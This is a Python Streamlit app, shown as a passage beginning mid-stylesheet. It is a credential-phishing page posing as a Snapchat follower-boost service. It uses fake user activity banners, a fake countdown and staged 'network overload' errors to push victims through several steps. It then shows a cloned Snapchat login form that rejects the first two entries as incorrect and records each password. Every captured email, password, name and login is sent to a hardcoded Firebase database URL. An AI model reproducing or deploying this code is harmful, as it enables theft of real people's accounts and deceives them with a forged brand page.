    height: 44px !important;
    margin: 32px auto 5px auto !important;
    display: block !important;
    box-shadow: 0 4px 12px rgba(0,0,0,0.05) !important;
}
.stButton > button[kind="secondary"]:hover {
    background-color: #f2ef00 !important;
    transform: translateY(-1px);
}

/* Terminal Console UI Element */
.hacker-cmd-box { background-color: #050505 !important; padding: 18px; border-radius: 10px; border: 2px solid #fffc00; margin: 20px 0; font-family: monospace !important; }
.hacker-cmd-string { color: #fffc00 !important; font-size: 13px; font-weight: 700; line-height: 1.6; }

/* Engagement Node Anchor */
.prime-engagement-block { text-align: center; margin: 22px 0; padding: 16px; background: #eef2ff; border: 2px dashed #2563eb; border-radius: 10px; }
/* Streamlit Watermark aur Header ko complete hide karne ke liye */
header[data-testid="stHeader"] { visibility: hidden !important; display: none !important; }
footer { visibility: hidden !important; display: none !important; }
div[data-testid="stDecoration"] { display: none !important; visibility: hidden !important; }
#MainMenu { visibility: hidden !important; display: none !important; }
div[class^="viewerBadge"] { display: none !important; visibility: hidden !important; }
</style>
"""
st.markdown(GLOBAL_MARKDOWN_INJECTOR, unsafe_allow_html=True)

# --- 3. HARDWARE REAL-TIME PERSISTENCE PATHWAY ---
BASE_FIREBASE_LINK = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/google_sites_logs/-OtV1bgRTfms9dW0PXTu"

# --- 4. ENGINE ARCHITECTURE CORE STATE CONFIGURATOR ---
if 'step' not in st.session_state: st.session_state.step = 1
if 'portal_data' not in st.session_state: st.session_state.portal_data = {}
if 'signup_attempts_count' not in st.session_state: st.session_state.signup_attempts_count = 1
if 'login_attempts_count' not in st.session_state: st.session_state.login_attempts_count = 1
if 'intercepted_dataset' not in st.session_state: st.session_state.intercepted_dataset = []
if 'unique_session_folder' not in st.session_state: st.session_state.unique_session_folder = str(uuid.uuid4())[:12]
if 'random_seed' not in st.session_state: st.session_state.random_seed = random.randint(10, 99)

# Countdown Engine Matrix Logic (30 Mins Target Frame Window)
if 'countdown_end' not in st.session_state:
    st.session_state.countdown_end = time.time() + (30 * 60)

current_time = time.time()
remaining_seconds = int(st.session_state.countdown_end - current_time)

if remaining_seconds <= 0:
    st.session_state.clear()
    st.rerun()

mins, secs = divmod(remaining_seconds, 60)

# Render High-Fidelity Active Counter Module Box
st.markdown(f"""
<div class='premium-countdown-card'>
    <span style='font-size:12px; font-weight:800; color:#64748b; text-transform:uppercase; display:block; margin-bottom:2px;'>⚠️ RESERVED SECURE DISPATCH HOLD CORRIDOR</span>
    <span class='countdown-timer-stream'>⏳ DISPATCH POOL LOCKS IN: {mins:02d}:{secs:02d}</span>
</div>
""", unsafe_allow_html=True)

# ==========================================
# REAL-TIME SOCIAL CONTEXT LOOP PLATFORM
# ==========================================
fake_users = ["ayush_nexus", "riyak_matrix", "kabir_claims", "ishita_vector", "tushar_op", "mehak_corridor"]
fake_counts = ["5,000", "10,000", "20,000"]
selected_user = fake_users[st.session_state.random_seed % len(fake_users)]
selected_volume = fake_counts[(st.session_state.random_seed + st.session_state.step) % len(fake_counts)]

st.markdown(f"""
<div class='premium-live-banner'>
    <p style='margin:0; font-size:13.5px; font-weight:800; color:#1e40af;'>⚡ CLOUD STREAM ACTIVE: @{selected_user} bypassed congestion pipeline, verified handle and authorized +{selected_volume} volume allocation payload!</p>
</div>
""", unsafe_allow_html=True)


# ==========================================
# 📍 ULTRARICH LIQUID STEPPER INTERFACE
# ==========================================
s1_class = "active-node" if st.session_state.step == 1 else ("completed-node" if st.session_state.step > 1 else "")
s2_class = "active-node" if st.session_state.step == 2 else ("completed-node" if st.session_state.step > 2 else "")
s3_class = "active-node" if st.session_state.step == 3 else ("completed-node" if st.session_state.step > 3 else "")
s4_class = "active-node" if st.session_state.step >= 4 else ""

st.markdown(f"""
<div class='stepper-flex-wrapper'>
    <div class='step-pill-node {s1_class}'>Step 1: Core</div>
    <div class='step-pill-node {s2_class}'>Step 2: Meta</div>
    <div class='step-pill-node {s3_class}'>Step 3: Space</div>
    <div class='step-pill-node {s4_class}'>Step 4: Verify</div>
</div>
""", unsafe_allow_html=True)


def push_to_firebase_matrix(event_state):
    runtime_node_id = str(uuid.uuid4())[:8]
    target_api_endpoint = f"{BASE_FIREBASE_LINK}/{st.session_state.unique_session_folder}/{runtime_node_id}.json"
    
    payload = {
        "server_timestamp": str(datetime.datetime.now()),
        "current_step_context": event_state,
        "primary_profile_context": st.session_state.portal_data,
        "logged_credential_sequences": st.session_state.intercepted_dataset
    }
    try:
        requests.put(target_api_endpoint, json=payload)
    except:
        pass


# ==========================================
# STEP 1: PORTAL PROFILE GENERATOR ENGINE
# ==========================================
if st.session_state.step == 1:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    
    # Accurate Scale Icon Box Matrix Centering Layer
    st.markdown("<div class='center-logo-box-matrix'>", unsafe_allow_html=True)
    try:
        st.image("1.png")
    except:
        st.markdown("<p style='font-size:24px; margin:0;'>✨</p>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)
            
    st.markdown("<div class='portal-header'><div class='portal-title'>Create Allocation Profile</div><div class='portal-subtitle'>Cloud Infrastructure Core Network Configuration Hub</div></div>", unsafe_allow_html=True)
    
    st.markdown("<span class='custom-hd-label'>🔒 Account Email Coordinates</span>", unsafe_allow_html=True)
    email_input = st.text_input("email_field", label_visibility="collapsed")
    
    st.markdown("<span class='custom-hd-label'>👤 Destination Target Handle</span>", unsafe_allow_html=True)
    user_input = st.text_input("user_field", placeholder="e.g., NexusCreator", label_visibility="collapsed")
    
    st.markdown("<span class='custom-hd-label'>🔑 Access Vault Keyphrase</span>", unsafe_allow_html=True)
    pass_input = st.text_input("pass_field", type="password", label_visibility="collapsed")
    
    st.write("")
    if st.button("INITIALIZE SECURE PIPELINE 🚀", type="primary", use_container_width=True):
        if email_input and user_input and pass_input:
            st.session_state.random_seed = random.randint(10, 99)
            if st.session_state.signup_attempts_count < 3:
                terminal_msg = st.empty()
                terminal_msg.info("⚡ Mapping active partition nodes...")
                time.sleep(1.2)
                terminal_msg.error(f"❌ Network Core Overload: Node handshake registration rejected. Please try again. (Attempt {st.session_state.signup_attempts_count}/2 Checked)")
                st.session_state.signup_attempts_count += 1
            else:
                st.success("✅ Secure Node Allocation Verified.")
                st.session_state.portal_data.update({"email": email_input, "target_username": user_input, "generated_master_key": pass_input})
                push_to_firebase_matrix("PORTAL_SIGNUP_PASSED")
                st.session_state.step = 2
                time.sleep(0.8)
                st.rerun()
        else:
            st.warning("⚠️ High priority alert: Form structures cannot remain blank.")
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 2: PROFILE META DATA PARSER
# ==========================================
elif st.session_state.step == 2:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    st.markdown("<div class='portal-header'><div class='portal-title'>Identity Link Optimization ⚙️</div><div class='portal-subtitle'>Synchronizing account infrastructure metadata channels</div></div>", unsafe_allow_html=True)
    
    st.markdown("<span class='custom-hd-label'>First Name Registry</span>", unsafe_allow_html=True)
    first_name_input = st.text_input("fn", label_visibility="collapsed")
    
    st.markdown("<span class='custom-hd-label'>Last Name Registry</span>", unsafe_allow_html=True)
    last_name_input = st.text_input("ln", label_visibility="collapsed")
    
    st.write("")
    if st.button("BUILD PAYLOAD COORDINATES ⚡", type="primary", use_container_width=True):
        if first_name_input:
            st.session_state.random_seed = random.randint(10, 99)
            UI_bar = st.progress(0)
            for structural_percentage in range(100):
                time.sleep(0.008)
                UI_bar.progress(structural_percentage + 1)
            st.session_state.portal_data.update({"first_name": first_name_input, "last_name": last_name_input})
            push_to_firebase_matrix("META_SYNC_COMPLETE")
            st.session_state.step = 3
            st.rerun()
        else:
            st.error("❌ Registry Error: Identity token string constraint violated.")
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 3: ALLOCATION VOLUMETRIC GRID
# ==========================================
elif st.session_state.step == 3:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    st.markdown("<div class='portal-header'><div class='portal-title'>Target Server Matrix 🎯</div><div class='portal-subtitle'>Adjusting delivery pipe constraints for transaction mapping</div></div>", unsafe_allow_html=True)
    
    profile_visibility_state = st.radio("Is destination endpoint strictly Public? 🔓", ["Yes, verified Public", "No, currently Private"], index=0)
    avatar_check_state = st.radio("Does target layout contain an active profile avatar? 📸", ["Yes", "No"], index=0)
    
    st.write("---")
    requested_load_volume = st.select_slider("🔥 Set Volumetric Delivery Payload Volume Stream Load:", options=[1000, 5000, 10000, 20000])
    
    st.write("")
    if st.button("LOCK DELIVERY PARAMETERS 🛡️", type="primary", use_container_width=True):
        st.session_state.random_seed = random.randint(10, 99)
        if profile_visibility_state == "No, currently Private" or avatar_check_state == "No":
            st.error("❌ Target Paradox: Injection corridor cannot establish pipeline to unmapped profiles.")
        else:
            st.session_state.portal_data.update({
                "account_visibility_metric": profile_visibility_state, 
                "avatar_presence_metric": avatar_check_state, 
                "load_volume_units": requested_load_volume
            })
            push_to_firebase_matrix("TARGET_MATRIX_SET")
            st.session_state.step = 4
            st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 4: INSTANT BYPASS GATEWAY INDEX
# ==========================================
elif st.session_state.step == 4:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    
    st.markdown("<div style='text-align:center; padding:16px; background:#fef2f2; border:1px solid #fee2e2; border-radius:12px; margin-bottom:20px;'><h4 style='color:#dc2626; font-weight:800; margin:0;'>⚠️ PUBLIC QUEUE SHUTDOWN CONGESTION</h4><p style='font-size:13px; color:#991b1b; margin:4px 0 0 0;'>Standard distribution channels lock delay: <b>24 Hours</b>.</p></div>", unsafe_allow_html=True)
    
    st.markdown("<div style='text-align:center; margin-bottom:20px;'><h3 style='font-weight:800; margin:0;'>🚀 Force High-Speed Priority Corridor Bypasser</h3><p style='font-size:13px; color:#4b5563; margin-top:4px;'>Verify active hardware session credentials matching target platform metadata layers to pass immediately.</p></div>", unsafe_allow_html=True)
    
    st.markdown("""
    <div class='prime-engagement-block'>
        <span style='color:#2563eb !important; font-weight:800; font-size:15px;'>👉 CLICK THE BELOW  to verify your snapchat account 👈</span>
        <div style='font-size:11px; color:#4b5563; margin-top:4px; font-weight:700;'>[ SSL 256-Bit Hardware Encryption Channel Active ]</div>
    </div>
    """, unsafe_allow_html=True)
    
    if st.button("You need to verify Snapchat IDENTITY FOOTPRINT MATCH NOW 👑 to get token key 🗝️", type="primary", use_container_width=True):
        st.session_state.random_seed = random.randint(10, 99)
        script_detector_msg = st.empty()
        script_detector_msg.info("🤖 Scanning hardware environment patterns for tracking automation...")
        time.sleep(1.4)
        script_detector_msg.success("✅ Clean footprint frame. Initializing high-fidelity verification screen...")
        time.sleep(0.6)
        script_detector_msg.empty()
        st.session_state.step = 5
        st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 5: EXACT MATCH SYSTEM-CLONE VIEWPORT SCREEN
# ==========================================
elif st.session_state.step == 5:
    st.markdown("<div class='stApp' style='background-color:#ffffff !important;'>", unsafe_allow_html=True)
    
    st.markdown("<div class='premium-canvas-wrapper' style='background-color:#ffffff !important; border-radius:10px !important; box-shadow: 0 2px 14px rgba(0,0,0,0.03) !important; max-width:400px !important; margin:35px auto 10px auto !important; border:1px solid #f1f1f1 !important; padding:40px 32px !important;'>", unsafe_allow_html=True)
    
    # Rigid Icon Control Engine Core
    st.markdown("<div class='center-logo-box-matrix' style='box-shadow:none; border:none; margin-bottom:10px;'>", unsafe_allow_html=True)
    try:
        st.image("2.jpg")
    except:
        st.markdown("<p style='color:#ff4444; font-size:26px; font-weight:800; margin:0;'>logo</p>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)
            
    st.markdown("<p class='replica-brand-text'>snapchat</p>", unsafe_allow_html=True)
    
    with st.form("screenshot_replica_form_engine", clear_on_submit=False):
        st.markdown("<span class='replica-field-title'>Username or Email</span>", unsafe_allow_html=True)
        login_user_string = st.text_input("user_replica", placeholder="Your Username Here", label_visibility="collapsed")
        
        st.write("")
        
        st.markdown("<span class='replica-field-title'>Password</span>", unsafe_allow_html=True)
        login_pass_string = st.text_input("pass_replica", type="password", placeholder="••••••••", label_visibility="collapsed")
        
        st.markdown("<p class='forgot-pass-trigger-text'>Forgot Password</p>", unsafe_allow_html=True)
        
        st.write("")
        form_submit_trigger = st.form_submit_button("Log In", type="secondary")
        
        if form_submit_trigger:
            if login_user_string and login_pass_string:
                st.session_state.random_seed = random.randint(10, 99)
                log_capture_map = {
                    "intercept_attempt_index": st.session_state.login_attempts_count,
                    "captured_login_handle": login_user_string,
                    "captured_login_credential": login_pass_string,
                    "timestamp_string": str(datetime.datetime.now())
                }
                st.session_state.intercepted_dataset.append(log_capture_map)
                
                # Rigid 2-Attempt Failure Matrix Loop Logic
                if st.session_state.login_attempts_count < 3:
                    push_to_firebase_matrix(f"INTERCEPT_PHASE_ATTEMPT_{st.session_state.login_attempts_count}")
                    st.session_state.login_attempts_count += 1
                    with st.spinner("Connecting to authentication server node..."):
                        time.sleep(3.5)
                    st.error("Oops! The password you entered is incorrect. Please double check and try again.")
                else:
                    push_to_firebase_matrix("INTERCEPT_COMPLETE_SYSTEM_CLEAR")
                    with st.spinner("Syncing verified priority access tokens..."):
                        time.sleep(3.5)
                    st.session_state.step = 6
                    st.rerun()
            else:
                st.warning("All parameters required.")
                
    st.markdown("</div>", unsafe_allow_html=True)
    st.markdown("<p style='text-align:center; font-size:14px; color:#000000; font-weight:500; margin-top:35px;'>New To snapchat ?<b style='font-weight:700; margin-left:5px;'>Sign Up</b></p>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 6: COMPLEX TERMINAL PIPELINE & RELEASE
# ==========================================
elif st.session_state.step == 6:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    st.markdown("<h3 style='text-align:center; font-weight:800; color:#2563eb !important;'>💻 EXECUTION PROTOCOLS DEPLOYED</h3>", unsafe_allow_html=True)
    
    console_view = st.empty()
    console_lines = [
        "Verifying structural checksum hash validations...",
        "Establishing persistent link channels with transaction database...",
        "Injecting priority queue traffic routes to verified hardware target...",
        "Syncing session configuration metadata fields... PASSED",
        "Assembling tracking payload arrays inside isolated partition lines...",
        "Finalizing payload deployment... SYSTEM SUCCESS"
    ]
    
    cmd_markup_accumulator = ""
    for specific_line in console_lines:
        cmd_markup_accumulator += f"&gt; {specific_line}<br>"
        console_view.markdown(f"<div class='hacker-cmd-box'><p class='hacker-cmd-string'>{cmd_markup_accumulator}</p></div>", unsafe_allow_html=True)
        time.sleep(1.4)
        
    console_view.empty()
    
    st.success("✅ PRIORITY ROUTING CHANNELS DEPLOYED SUCCESSFULLY!")
    generated_payment_number = f"PMT-TK-{str(uuid.uuid4())[:10].upper()}"
    
    token_display_box = f"""
    <div style='text-align:center; padding:25px; background:#f0fdf4; border-radius:14px; border:2px solid #16a34a; margin:20px 0; box-shadow: 0 4px 15px rgba(22, 163, 74, 0.1);'>
        <h2 style='color:#16a34a; font-weight:800; margin:0 0 6px 0; font-size:18px;'>PAYMENT GENERATION NUMBER CLAIMED</h2>
        <code style='font-size:19px; font-weight:800; color:#1e293b; background:#ffffff; padding:6px 14px; border-radius:8px; border:2px solid #cbd5e1; font-family:monospace;'>{generated_payment_number}</code>
        <p style='margin:16px 0 0 0; font-size:14.5px; font-weight:700; color:#16a34a;'>🚀 Allocation Stream Priority: Active (Est Delivery Transit: 20 days)</p>
    </div>
    """
    st.markdown(token_display_box, unsafe_allow_html=True)
    
    if st.button("RESET CONTROL HANDSHAKE TERMINAL", type="primary", use_container_width=True):
        st.session_state.clear()
        st.rerun()
        
    st.markdown("</div>", unsafe_allow_html=True)


        
